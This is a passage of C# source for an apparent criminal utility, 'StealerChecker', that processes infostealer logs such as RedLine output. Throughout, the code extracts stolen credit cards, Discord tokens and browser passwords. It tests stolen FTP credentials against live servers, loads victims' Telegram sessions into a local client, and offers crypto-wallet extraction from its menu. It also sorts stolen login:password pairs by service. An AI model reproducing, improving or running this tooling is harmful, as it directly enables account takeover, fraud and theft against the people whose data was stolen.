using CommandLine;
using Everything;
using Everything.Model;
using FluentFTP;
using Newtonsoft.Json.Linq;
using SharpCompress.Archives;
using SharpCompress.Common;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using TemnijExt;
using static stealerchecker.Program;
using Console = Colorful.Console;

namespace stealerchecker
{
    internal static class Program
    {
        public class Options
        {
            [Option('p', "path", Required = true, HelpText = "Path to folder with logs")]
            public string Path { get; set; }

            [Option('v', "verbose", Required = false, HelpText = "Passwords view verbose mode")]
            public bool Verbose { get; set; }

            [Option('e', "everything", Required = false, HelpText = "Use Everything service")]
            public bool Everything { get; set; }

            [Option('a', "all", Required = false, HelpText = "Search all logs", Hidden = true)]
            public bool All { get; set; }
        }

        #region FIELDS

        internal static string tag = "8.0";
        internal static string caption = $"StealerChecker v{tag} by Temnij";
        internal static string path;
        internal static readonly List<string> files = new();
        internal static readonly List<string> directories = new();
        internal static bool Verbose;
        internal static bool All;
        internal static bool Everything;
        internal static string NewLine = Environment.NewLine;

        #endregion

        private static void Main(string[] args)
        {
            // Update();
            SetStatus();
            #region ARGUMENT PARSING

            Parser.Default.ParseArguments<Options>(args)
                   .WithParsed(o => { path = o.Path; Verbose = o.Verbose; Everything = o.Everything; All = o.All; });

            if (string.IsNullOrEmpty(path))
            {
                Console.WriteLine("Проблемы?\n" +
                    "1. Создайте файл start.cmd в этой же папке\n" +
                    "2. Пропишите в нём: stealerchecker.exe -p c:/путь/до/папки/с/логами\n" +
                    "3. Кликните по нему два раза", Color.Red);
                Console.ReadKey();
                Environment.Exit(-1);
            }

            #endregion
            #region LOADING

            Console.WriteLine("Please wait, loading...", Color.LightCyan);

            if (!Everything)
            {
                SetStatus("Adding Directories...");
                AddDirectories();
                Console.WriteLine($"Directories added: {directories.Count}", Color.Gray);
                SetStatus("Adding files...");
                AddFiles();
                Console.WriteLine($"Files added: {files.Count}", Color.Gray);
            }
            else
                GetFilesAsync().Wait();

            glob = GetPasswords();

            Console.Clear();
            SetStatus();

            #endregion

            while (true)
                PrintMainMenu();
        }

        #region FILES

        internal static void AddDirectories()
        {
            foreach (var directory in Directory.GetDirectories(path, "*", SearchOption.AllDirectories))
                directories.Add(directory);
        }
        internal static void AddFiles()
        {
            foreach (var dir in directories)
                foreach (var file in Directory.GetFiles(dir))
                    if (Path.GetFileName(file) == "InfoHERE.txt"
                        || Path.GetFileName(file) == "InfoHERE.html"
                        || Path.GetFileName(file) == "UserInformation.txt")
                        files.Add(file);
        }

        #endregion
        #region CCs

        internal static void GetCC()
        {
            foreach (var file in files)
            {
                if (Path.GetFileName(file) == "InfoHERE.txt"
                       || Path.GetFileName(file) == "InfoHERE.html")
                {
                    SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                    var match = Regex.Match(File.ReadAllText(file), @"∟💳(\d*)");
                    var cards = int.Parse(match.Groups[1].Value);

                    if (cards != 0)
                    {
                        Console.Write($"[{file}]", Color.Green);
                        Console.WriteLine($" - {cards} cards!");

                        Console.WriteLine(WriteCC(file));
                    }
                }
            }
            SetStatus();
        }
        internal static string WriteCC(string path)
        {
            var returned = "";

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var cardsFolder = Path.Combine(dir, "Browsers", "Cards");

            foreach (var file in Directory.GetFiles(cardsFolder))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    returned += thisFile.GetContent() + NewLine;
            }

            return returned;
        }

        #endregion
        #region FTPs

        internal static void GetFTP()
        {
            foreach (var file in files)
            {
                if (Path.GetFileName(file) == "InfoHERE.txt")
                {
                    SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                    var match = Regex.Match(File.ReadAllText(file), @"📡 FTP\s*∟ FileZilla: (❌|✅).*\s*∟ TotalCmd: (❌|✅).*");

                    var fileZila = match.Groups[1].Value == "✅";
                    var totalCmd = match.Groups[2].Value == "✅";

                    if (fileZila)
                    {
                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                        Console.WriteLine(" - FileZila");

                        WriteFileZila(file);
                    }
                    if (totalCmd)
                    {
                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                        Console.WriteLine(" - Total Commander");

                        Console.WriteLine(WriteTotalCmd(file));
                    }
                }
                else if (Path.GetFileName(file) == "InfoHERE.html")
                {
                    SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                    var match = Regex.Match(File.ReadAllText(file), "<h2 style=\"color:white\">📡 FTP<\\/h2>\\s*<p style=\"color:white\">   ∟ FileZilla: (❌|✅)<\\/p>\\s*<p style=\"color:white\">   ∟ TotalCmd: (❌|✅)<\\/p>");

                    var fileZila = match.Groups[1].Value == "✅";
                    var totalCmd = match.Groups[2].Value == "✅";

                    if (fileZila)
                    {
                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                        Console.WriteLine(" - FileZila");

                        WriteFileZila(file);
                    }
                    if (totalCmd)
                    {
                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                        Console.WriteLine(" - Total Commander");

                        Console.WriteLine(WriteTotalCmd(file));
                    }
                }
                else if (Path.GetFileName(file) == "UserInformation.txt")
                {
                    var logFolder = new FileInfo(file).Directory.FullName;
                    if (Directory.Exists(Path.Combine(logFolder, "FTP"))
                        && File.Exists(Path.Combine(logFolder, "FTP", "Credentials.txt")))
                    {
                        Console.Write($"[{new FileInfo(file).Directory.FullName}]", Color.Green);
                        Console.WriteLine(" - RedLine FTP");

                        CheckRedlineFtp(File.ReadAllText(Path.Combine(logFolder, "FTP", "Credentials.txt")));
                    }
                }
            }

            Console.WriteLine($"Good FTPs:\n{string.Join(Environment.NewLine, goodFTPs.Distinct())}", Color.LightGreen);
            goodFTPs.Clear();

            SetStatus();
        }
        internal static void WriteFileZila(string path)
        {
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var fileZilaFolder = Path.Combine(dir, "FileZilla");

            foreach (var file in Directory.GetFiles(fileZilaFolder))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    CheckFileZilla(thisFile.GetContent());
                Console.WriteLine();
            }
        }
        static List<string> goodFTPs = new();
        internal static void CheckFileZilla(string fileZillaLog)
        {
            const string pattern = @"Host: (.*)\s*Port: (.*)\s*User: (.*)\s*Pass: (.*)";
            foreach (Match match in Regex.Matches(fileZillaLog, pattern))
            {
                string
                    Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                    Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                    User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
                    Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "");

                try
                {
                    SetStatus($"Checking {Host}...");
                    FtpClient client = new(Host)
                    {
                        Port = int.Parse(Port),
                        Credentials = new NetworkCredential(User, Pass),
                        ConnectTimeout = 5000,
                        DataConnectionConnectTimeout = 5000,
                        DataConnectionReadTimeout = 5000,
                        ReadTimeout = 5000
                    };

                    client.Connect();
                    client.Disconnect();

                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - GOOD", Color.LightGreen);
                    goodFTPs.Add($"{Host}:{Port};{User}:{Pass} - GOOD");
                }
                catch (FtpAuthenticationException)
                {
                    try
                    {
                        SetStatus($"Checking for anonymous auth {Host}...");
                        FtpClient client = new(Host)
                        {
                            Port = int.Parse(Port),
                            Credentials = new NetworkCredential("anonymous", ""),
                            ConnectTimeout = 5000,
                            DataConnectionConnectTimeout = 5000,
                            DataConnectionReadTimeout = 5000,
                            ReadTimeout = 5000
                        };

                        client.Connect();
                        client.Disconnect();

                        Console.WriteLine($"{Host}:{Port};anonymous: - GOOD", Color.LightGreen);
                    }
                    catch
                    {
                        Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
                    }
                }
                catch
                {
                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
                }
            }
        }
        internal static void CheckRedlineFtp(string redLineLog)
        {
            const string pattern = @"Server: (.*):(.*)\s*Username: (.*)\s*Password: (.*)\s*";
            foreach (Match match in Regex.Matches(redLineLog, pattern))
            {
                string
                    Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                    Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                    User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
                    Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "");

                try
                {
                    SetStatus($"Checking {Host}...");
                    FtpClient client = new(Host)
                    {
                        Port = int.Parse(Port),
                        Credentials = new NetworkCredential(User, Pass),
                        ConnectTimeout = 5000,
                        DataConnectionConnectTimeout = 5000,
                        DataConnectionReadTimeout = 5000,
                        ReadTimeout = 5000
                    };

                    client.Connect();
                    client.Disconnect();

                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - GOOD", Color.LightGreen);
                    goodFTPs.Add($"{Host}:{Port};{User}:{Pass} - GOOD");
                }
                catch (FtpAuthenticationException)
                {
                    try
                    {
                        SetStatus($"Checking for anonymous auth {Host}...");
                        FtpClient client = new(Host)
                        {
                            Port = int.Parse(Port),
                            Credentials = new NetworkCredential("anonymous", ""),
                            ConnectTimeout = 5000,
                            DataConnectionConnectTimeout = 5000,
                            DataConnectionReadTimeout = 5000,
                            ReadTimeout = 5000
                        };

                        client.Connect();
                        client.Disconnect();

                        Console.WriteLine($"{Host}:{Port};anonymous: - GOOD", Color.LightGreen);
                    }
                    catch
                    {
                        Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
                    }
                }
                catch
                {
                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
                }
            }
        }
        internal static string WriteTotalCmd(string path)
        {
            var returned = "";

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var totalCmdDir = Path.Combine(dir, "FTP", "Total Commander");

            foreach (var file in Directory.GetFiles(totalCmdDir))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    returned += thisFile.GetContent() + NewLine;
            }

            return returned;
        }

        #endregion
        #region DISCORD

        internal static void GetDiscord()
        {
            List<string> tokens = new();

            foreach (var file in files)
            {
                var info = new FileInfo(file);
                SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");

                if (info.Name == "InfoHERE.txt"
                    || info.Name == "InfoHERE.html")
                {
                    var match = Regex.Match(File.ReadAllText(file), "💬 Discord: (✅|❌)");

                    var discord = match.Groups[1].Value == "✅";

                    try
                    {
                        if (discord)
                            tokens.AddRange(WriteDiscord(file, false));
                    }
                    catch { }
                }
                else if (info.Name == "UserInformation.txt")
                {
                    try
                    {
                        tokens.AddRange(WriteDiscord(file, true));
                    }
                    catch { }
                }
            }
            SetStatus();

            File.WriteAllLines("DiscordTokens.txt", tokens.Distinct());
        }
        internal static List<string> WriteDiscord(string path, bool redline)
        {
            List<string> tokensList = new();

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            string discordDir;

            if (!redline)
                discordDir = Path.Combine(dir, "Discord", "Local Storage", "leveldb");
            else
                discordDir = Path.Combine(dir, "Discord");


            foreach (var file in Directory.GetFiles(discordDir))
            {
                try
                {
                    var thisFile = FileCl.Load(file);
                    if (thisFile.Info.Length > 5)
                    {
                        var tokens = CheckDiscord(thisFile.GetContent());
                        if (tokens.Count != 0)
                        {
                            Console.WriteLine();
                            var newfile = "";
                            if (File.Exists(file))
                                if (!redline)
                                    newfile = FileCl.Load(file).Info.Directory.Parent.Parent.Parent.FullName;
                                else
                                    newfile = FileCl.Load(file).Info.Directory.Parent.FullName;

                            Console.Write($"[{newfile}]", Color.Green);
                            Console.WriteLine(" - Discord");

                            Console.WriteLine($"{string.Join(NewLine, tokens.Distinct().Where(x => x.Length > 5))}", Color.LightGreen);
                            tokensList.AddRange(tokens);
                        }
                    }
                }
                catch
                {

                }
            }

            return tokensList;
        }
        internal static List<string> CheckDiscord(string content)
        {
            var tokens = new List<string>();
            foreach (Match match in Regex.Matches(content, "[^\"]*"))
                if (match.Length == 59 && match.Value.StartsWith("N") && Regex.IsMatch(match.Value, @"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}"))
                    tokens.Add(match.Value);

            tokens.Distinct();
            return tokens;
        }

        #endregion
        #region SEARCH

        #region URL

        internal static void SearchByURL(string query)
        {
            SetStatus("Working... ");
            Console.WriteLine(string.Join(NewLine, SearchByURLHerlper(query)), Color.LightGreen);
            SetStatus();
        }
        private static List<string> SearchByURLHerlper(string query)
        {
            if (!Verbose)
                return glob.Where(x => x.Url.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0).Select(y => $"{y.Login}:{y.Pass}").Distinct().ToList();
            else
                return glob.Where(x => x.Url.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0).Select(y => $"{y.Login}:{y.Pass}\t{y.Url}").Distinct().ToList();
        }

        #endregion
        #region USERNAME

        internal static void SearchByUsername(string query)
        {
            SetStatus("Working... ");
            Console.WriteLine(string.Join(NewLine, SearchByUsernameHelper(query)), Color.LightGreen);
            SetStatus();
        }
        private static List<string> SearchByUsernameHelper(string query)
        {
            if (!Verbose)
                return glob.Where(x => x.Login.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0).Select(y => $"{y.Login}:{y.Pass}").Distinct().ToList();
            else
                return glob.Where(x => x.Login.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0).Select(y => $"{y.Login}:{y.Pass}\t{y.Url}").Distinct().ToList();
        }

        #endregion
        #region PASSWORD

        internal static void SearchByPass(string query)
        {
            SetStatus("Working... ");
            Console.WriteLine(string.Join(NewLine, SearchByPassHelper(query)), Color.LightGreen);
            SetStatus();
        }
        private static List<string> SearchByPassHelper(string query)
        {
            if (!Verbose)
                return glob.Where(x => x.Pass.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0).Select(y => $"{y.Login}:{y.Pass}").Distinct().ToList();
            else
                return glob.Where(x => x.Pass.IndexOf(query, StringComparison.OrdinalIgnoreCase) >= 0).Select(y => $"{y.Login}:{y.Pass}\t{y.Url}").Distinct().ToList();
        }

        #endregion

        #endregion
        #region TELEGRAM

        internal static int counter = 0;

        internal static void GetTelegram()
        {
            if (!Directory.Exists("Telegram"))
                Directory.CreateDirectory("Telegram");

            foreach (var file in files)
            {
                var match = Regex.Match(File.ReadAllText(file), "✈️ Telegram: (❌|✅)");

                if (match.Groups[1].Value == "✅")
                    CopyTelegram(file);
            }
            SetStatus();

            again:
            var dirs = new List<string>();
            foreach (var dir in Directory.GetDirectories("Telegram"))
                dirs.Add(new DirectoryInfo(dir).Name);

            var ordered = dirs
            .OrderBy(x => int.Parse(x))
            .ToList();

            foreach (var dir in ordered)
                Console.WriteLine(dir, Color.LightGreen);

            Console.WriteLine("Select Telegram:", Color.Green);
            var select = int.Parse(Console.ReadLine());

            try { Directory.Delete("tdata"); } catch { }

            SetStatus("Copying Telegram session");
            CopyFilesRecursively(Path.Combine("Telegram", select.ToString()), "tdata");
            SetStatus();

            Process.Start("Telegram.exe");

            Console.ReadLine();

            foreach (var process in Process.GetProcessesByName("Telegram"))
                process.Kill();

            goto again;
        }
        internal static void CopyTelegram(string path)
        {
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var tgDir = "";

            foreach (var tempDir in Directory.GetDirectories(dir))
                if (new DirectoryInfo(tempDir).Name.StartsWith("Telegram"))
                    tgDir = tempDir;

            CopyFilesRecursively(tgDir, Path.Combine(Directory.GetCurrentDirectory(), "Telegram", counter.ToString()));
            counter++;
            SetStatus($"{counter} telegram dirs copied");
        }

        private static void CopyFilesRecursively(string sourcePath, string targetPath)
        {
            try
            {
                if (!Directory.Exists(targetPath))
                    Directory.CreateDirectory(targetPath);
            }
            catch { }
            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
                Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));

            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
                File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
        }

        #endregion
        #region SORT LOGS

        internal static void SortLogs()
        {
            List<KeyValuePair<string, DateTime>> result = new();
            Console.WriteLine("Loading...", Color.DarkCyan);

            foreach (var file in files)
            {
                var filecl = FileCl.Load(file);
                var dir = filecl.Info.Directory.FullName;
                var sysFile = Path.Combine(dir, "System_Information.txt");
                var matchRus = Regex.Match(File.ReadAllText(sysFile), @"Current time Utc: ((\d*)\.(\d*)\.(\d*) (\d*):(\d*):(\d*))");
                var matchEur = Regex.Match(File.ReadAllText(sysFile), @"Current time Utc: ((\d*)\/(\d*)\/(\d*) (\d*):(\d*):(\d*) (AM|PM))");
                DateTime date = DateTime.Now;

                if (matchRus.Success)
                {
                    try
                    {
                        date = DateTime.Parse(matchRus.Groups[1].Value);
                        result.Add(new KeyValuePair<string, DateTime>(dir, date));
                    }
                    catch
                    {
                        throw;
                    }
                }

                if (matchEur.Success)
                {
                    try
                    {
                        date = DateTime.ParseExact(matchEur.Groups[1].Value, "M/d/yyyy h:mm:ss tt", CultureInfo.InvariantCulture);
                        result.Add(new KeyValuePair<string, DateTime>(dir, date));
                    }
                    catch
                    {
                        throw;
                    }
                }
            }

            Console.WriteLine("Loaded!", Color.LightGreen);
            Console.WriteLine();
            Console.WriteLine("Sorting by Year/Month...", Color.DarkCyan);

            if (!Directory.Exists("Sorts"))
                Directory.CreateDirectory("Sorts");
            else
            {
                Console.WriteLine("Directory exists, deleting...", Color.Pink);
                deleteFolder("Sorts");
                Console.WriteLine("Deleted!", Color.LightGreen);
                Directory.CreateDirectory("Sorts");
            }

            foreach (var pair in result)
            {
                var date = pair.Value;
                var directory = pair.Key;
                var year = date.Year.ToString();
                var month = date.Month.ToString();

                if (!Directory.Exists(Path.Combine("Sorts", year)))
                    Directory.CreateDirectory(Path.Combine("Sorts", year));
                if (!Directory.Exists(Path.Combine("Sorts", year, month)))
                    Directory.CreateDirectory(Path.Combine("Sorts", year, month));

                CopyFilesRecursively(directory, Path.Combine("Sorts", year, month, new DirectoryInfo(directory).Name));
                SetStatus($"Copying... Directory {result.IndexOf(pair)}/{result.Count}");
            }
            SetStatus();

            Console.WriteLine("Sorted!", Color.Green);
        }
        private static void deleteFolder(string folder)
        {
            try
            {
                DirectoryInfo di = new(folder);
                DirectoryInfo[] diA = di.GetDirectories();
                foreach (FileInfo f in di.GetFiles())
                    f.Delete();

                foreach (DirectoryInfo df in diA)
                {
                    deleteFolder(df.FullName);
                    if (df.GetDirectories().Length == 0 && df.GetFiles().Length == 0) df.Delete();
                }
            }
            catch (DirectoryNotFoundException ex)
            {
                Console.WriteLine("Директория не найдена. Ошибка: " + ex.Message);
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine("Отсутствует доступ. Ошибка: " + ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Произошла ошибка. Обратитесь к разрабу. Ошибка: " + ex.Message);
            }
        }

        #endregion
        #region STATUS FUNCTIONS

        internal static void SetStatus(string status)
        {
            Console.Title = caption + " | " + status;
        }

        internal static void SetStatus()
        {
            Console.Title = caption;
        }

        #endregion
        #region SORT BY CATEGORIES

        private static int counter2 = 0;
        private static int count2 = 0;
        private static List<Password> glob;

        internal static void SortLogsbyCategories()
        {
            SetStatus("Loading...");

            foreach (var file in Directory.GetFiles("services"))
                ProcessFile(file);

            SetStatus();
        }
        internal static List<Password> GetPasswords()
        {
            List<Password> passwords = new();

            foreach (var filePas in files)
            {
                var pas = new List<Password>();
                var filecl = FileCl.Load(filePas);
                var dir = filecl.Info.Directory.FullName;

                if (filecl.Info.Name == "InfoHERE.txt"
                    || filecl.Info.Name == "InfoHERE.html")
                {
                    var passwordsDir = Path.Combine(dir, "Browsers", "Passwords");

                    try
                    {
                        foreach (var file in Directory.GetFiles(passwordsDir))
                        {
                            var thisFile = FileCl.Load(file);

                            try
                            {
                                if (thisFile.Info.Name == "ChromiumV2.txt")
                                {
                                    var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Username: (.*)\s*Password: (.*)\s*Application: (.*)");

                                    pas.AddRange(log.OfType<Match>()
                                        .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                                }
                                if (thisFile.Info.Name == "Passwords_Google.txt")
                                {
                                    var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)\s*Browser: (.*)");

                                    pas.AddRange(log.OfType<Match>()
                                        .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                                }
                                if (thisFile.Info.Name == "Passwords_Mozilla.txt")
                                {
                                    var log = Regex.Matches(thisFile.GetContent(), @"URL : (.*)\s*Login: (.*)\s*Password: (.*)");

                                    pas.AddRange(log.OfType<Match>()
                                         .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
                                         .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                                }
                                if (thisFile.Info.Name == "Passwords_Opera.txt")
                                {
                                    var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Login: (.*)\s*Passwords: (.*)");

                                    pas.AddRange(log.OfType<Match>()
                                        .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value))
                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                                }
                                if (thisFile.Info.Name == "Passwords_Unknown.txt")
                                {
                                    var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");

                                    pas.AddRange(log.OfType<Match>()
                                        .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                                }
                            }
                            catch { }
                        }
                    }
                    catch
                    {

                    }
                }
                else if (filecl.Info.Name == "UserInformation.txt")
                {
                    try
                    {
                        var thisFile = FileCl.Load(Path.Combine(filecl.Info.DirectoryName, "Passwords.txt"));
                        var log = Regex.Matches(thisFile.GetContent(), @"URL: (.*)\s*Username: (.*)\s*Password: (.*)");

                        pas.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }
                }

                passwords.AddRange(pas);
            }

            return passwords.Distinct().ToList();
        }
        internal static void ProcessFile(string path)
        {
            var categoryName = Path.Combine("Categories", Path.GetFileNameWithoutExtension(path));
            var services = File.ReadAllLines(path);

            if (!Directory.Exists(categoryName))
                Directory.CreateDirectory(categoryName);

            count2 = glob.Count;
            foreach (var pass in glob)
            {
                counter2++;
                SetStatus($"Working... {counter2}/{count2}");

                string serviceName = "";
                if (services.Any(x => pass.Url.IndexOf(x, StringComparison.OrdinalIgnoreCase) >= 0))
                    serviceName = services.First(x => pass.Url.IndexOf(x, StringComparison.OrdinalIgnoreCase) >= 0);
                else
                    continue;
                var filename = Path.Combine(categoryName, serviceName) + ".txt";

                var login = pass.Login;
                login = login.Replace("(", "")
                    .Replace(")", "")
                    .Replace(" ", "")
                    .Replace("-", "")
                    .Replace("+", "");

                File.AppendAllText(filename, $"{login}:{pass.Pass}");
                File.WriteAllLines(filename, File.ReadAllLines(filename).Distinct());

            }
            counter2 = 0;
        }
        internal class Password
        {
            internal string Url;
            internal string Login;
            internal string Pass;

            internal Password(string url, string login, string pass)
            {
                Url = url;
                Login = login;
                Pass = pass;
            }
        }

        #endregion
        #region EVERYTHING

        internal static async Task GetFilesAsync()
        {
            var patterns = new List<string>()
            {
                "InfoHERE.txt",
                "InfoHERE.html",
                "UserInformation.txt"
            };
            files.AddRange(await GetPathsAsync(patterns).ConfigureAwait(false));
        }
        internal static async Task<List<string>> GetPathsAsync(List<string> patterns)
        {
            var pathsResult = new List<string>();
            var client = new EverythingClient();

            if (!All)
                foreach (var pattern in patterns)
                    pathsResult.AddRange((await client.SearchAsync(pattern).ConfigureAwait(false)).Items
                                    .OfType<FileResultItem>()
                                    .Where(file => file.FullPath.StartsWith(path.Replace("/", "\\"), StringComparison.OrdinalIgnoreCase))
                                    .Select(x => x.FullPath));
            else
                foreach (var pattern in patterns)
                    pathsResult.AddRange((await client.SearchAsync(pattern).ConfigureAwait(false)).Items
                                    .OfType<FileResultItem>()
                                    .Select(x => x.FullPath));
            return pathsResult;
        }

        #endregion
        #region MENU

        internal static void PrintSearchMenu()
        {
            var SearchMenu = new Menu()
            {
                menu = new Dictionary<string, Action>()
                {
                    { "Search by URL", () => SearchByURL(Ext.input("Enter query", Color.LightSkyBlue)) },
                    { "Search by Password", () => SearchByPass(Ext.input("Enter query", Color.LightSkyBlue)) },
                    { "Search by Username", () => SearchByUsername(Ext.input("Enter query", Color.LightSkyBlue)) }
                }.ToList(),
                Name = "Searhing"
            };
            SearchMenu.Print();
        }
        internal static void PrintSortMenu()
        {
            var SortMenu = new Menu()
            {
                menu = new Dictionary<string, Action>()
                {
                    { "Sort by date", () => SortLogs() },
                    { "Sort login:pass by categories", () => SortLogsbyCategories() }
                }.ToList(),
                Name = "Sorting"
            };
            SortMenu.Print();
        }
        internal static void PrintGetMenu()
        {
            var GetMenu = new Menu()
            {
                menu = new Dictionary<string, Action>()
                {
                    { "Get CC cards", () => GetCC() },
                    { "Get&Check FTP servers", () => GetFTP() },
                    { "Get Discord tokens", () => GetDiscord() },
                    { "Get Telegrams", () => GetTelegram() },
                    { "Get Cold Wallets", () => PrintWalletsMenu() },
                }.ToList(),
                Name = "Getting"
            };
            GetMenu.Print();
        }
        internal static void PrintWalletsMenu()
        {
            var WalletsMenu = new Menu()
            {
                menu = new Dictionary<string, Action>()
                {
                    { "Get All Wallets", () => GetAllWallets() },
                    { "Get Metamask Wallets", () => GetSpecWallets("Metamask") },
                    { "Get Exodus Wallets", () => GetSpecWallets("Exodus") },
                    { "Get Bitcoin Wallets", () => GetSpecWallets("Bitcoin") },
                    { "Get DogeCoin Wallets", () => GetSpecWallets("Dogecoin") }
                }.ToList(),
                Name = "Cold Wallets"
            };
            WalletsMenu.Print();
        }
        internal static void PrintAnalysisMenu()
        {
            Console.Clear();
            Console.WriteLine("Analysis", Color.Pink);
            Console.WriteLine();
            Console.Write("1. Total Passwords - ", Color.LightCyan);
            Console.WriteLine(glob.Count, Color.DarkCyan);
            Console.Write("2. Username in the password - ", Color.LightCyan);
            Console.WriteLine($"~{AnalyzeLoginInPass()}%", Color.DarkCyan);
            Console.Write("3. Username = password - ", Color.LightCyan);
            Console.WriteLine($"~{AnalyzeLoginEqualsPass()}%", Color.DarkCyan);
            Console.WriteLine("4. Most popular URLs:", Color.LightCyan);
            Console.WriteLine(AnalyzeMostPopularURLs(), Color.DarkCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintAnalysisMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;
                default: PrintAnalysisMenu(); break;
            }
        }
        internal static void PrintMainMenu()
        {
            Console.WriteLine();
            Console.WriteAscii("StealerChecker", Color.Pink);
            Console.WriteLine(caption, Color.Pink);
            Console.WriteLine($"Loaded: {files.Count} logs", Color.Gray);
            Console.WriteLine();
            Console.WriteLine("1. Get", Color.LightCyan);
            Console.WriteLine("2. Search", Color.LightCyan);
            Console.WriteLine("3. Sort Logs", Color.LightCyan);
            Console.WriteLine("4. Analysis", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine($"88. Verbose: {Verbose}", Color.Cyan);
            Console.WriteLine("99. Exit", Color.LightPink);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintMainMenu();
            }

            switch (selection)
            {
                case 1: PrintGetMenu(); break;
                case 2: PrintSearchMenu(); break;
                case 3: PrintSortMenu(); break;
                case 4: PrintAnalysisMenu(); break;

                case 88:
                    Verbose = !Verbose;
                    Console.Clear();
                    break;
                case 99: Environment.Exit(0); break;
            }
        }
        public class Menu
        {
            public List<KeyValuePair<string, Action>> menu;
            public string Name;
        }

        #endregion
        #region ANALYSIS

        internal static string AnalyzeMostPopularURLs()
        {
            var top3 = new StringBuilder();
            var query = glob.GroupBy(x => x.Url)
                            .Select(group => new { group.Key, Count = group.Count() })
                            .OrderByDescending(x => x.Count);
            foreach (var item in query.Take(5)) if (item.Key.Length > 3) top3.WriteLine($"\t{item.Key}");
            return top3.ToString();
        }
        internal static decimal AnalyzeLoginInPass()
        {
            SetStatus("Analyzing...");
            var count = glob
                .Count(x => x.Pass.IndexOf(x.Login, StringComparison.OrdinalIgnoreCase) >= 0);
            SetStatus();

            return Math.Round(GetPercent(glob.Count, count), 2);
        }
        internal static decimal AnalyzePercentOfURL(string url)
        {
            var count = glob
                .Count(x => x.Url.IndexOf(url, StringComparison.OrdinalIgnoreCase) >= 0);
            SetStatus();

